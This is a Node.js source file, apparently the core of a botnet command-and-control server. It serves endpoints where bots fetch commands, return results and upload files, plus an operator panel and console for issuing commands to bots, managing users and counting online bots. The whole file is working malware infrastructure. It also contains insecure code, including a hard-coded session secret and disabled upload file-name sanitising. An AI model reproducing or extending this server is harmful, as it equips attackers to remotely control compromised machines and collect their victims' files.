const
    db = require('./database.js'),
    bots  = require('./bots.js'),
    users = require('./users.js'),
    fs = require('fs'),
    https = require('https'),
    readline = require('readline'),
    express = require('express'),
    app = express(),
    bodyParser = require('body-parser'),
    fileUpload = require('express-fileupload'),
    cookies = require('express-session'),
    chalk = require('chalk');

//----------- INITIALIZATION -----------

const
    error = chalk.redBright('ERROR'),
    warning = chalk.keyword('orange')('WARN'),
    info = chalk.cyan('INFO');

db.loadBots();
db.loadUsers();
db.loadBlacklist();

app.use(bodyParser.urlencoded({extended: true}));
app.use(fileUpload({safeFileNames: false, preserveExtension: true}));
app.use(cookies({secret: 'WakeyWakey', resave: true, saveUninitialized: true, name: 'Session'}));

//--------------- SERVER ---------------

app.get('/cmd', bots.getCommands);
app.post('/cmd', bots.postResults);
app.post('/upload', bots.uploadFile);
app.use(express.static('Files'));

app.get('/bots', bots.getBots);
app.post('/login', users.login);
app.get('/files', users.getFiles);
app.get('/logs', users.getLogs);
app.post('/newcmd', users.postCommand);
app.post('/clear', users.clearLog);
app.post('/delete', users.deleteFile);

app.get('/style', users.getStyle);
app.get('/test', users.getTest);

const options = {
    key: fs.readFileSync('Certificate\\private.key'),
    cert: fs.readFileSync('Certificate\\certificate.crt')
};
var server = https.createServer(options, app);
server.listen(1337);
console.log(info, 'Listening started.');

//---------- PERIODIC EVENTS -----------

function updateStats(){
    if (db.Stats.length > 5) db.Stats.shift();
    db.Stats.push({
        time: Date.now(),
        count: db.getOnlineBotCount()
    });
}

setInterval(updateStats, 1 * 60 * 1000);
setInterval(db.autoSave, 5 * 60 * 1000);

//-------------- COMMANDS --------------

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
rl.on('line', function(input){
    input = input.split(' ');
    switch(input[0]){
        case 'try':
            console.log(db.List);
            break;
        case 'cmd':
            let bot = db.findBot(input[1]);
            db.addCommand(bot, input[2], JSON.parse(input.slice(3).join(' ')), null);
            break;
        case 'bots':
            db.printBots();
            break;
        case 'newuser':
            db.addUser(input[1], input[2], input[3]);
            break;
        case 'login':
            let ret = {};
            console.log(db.login(input[1], input[2], ret));
            console.log(ret);
            break;
        case 'uptime':
            console.log(db.uptime());
            break;
    }
});

rl.on('close', function(){
    console.log(info, 'Shutting down.');
    db.autoSave();
    process.exit();
});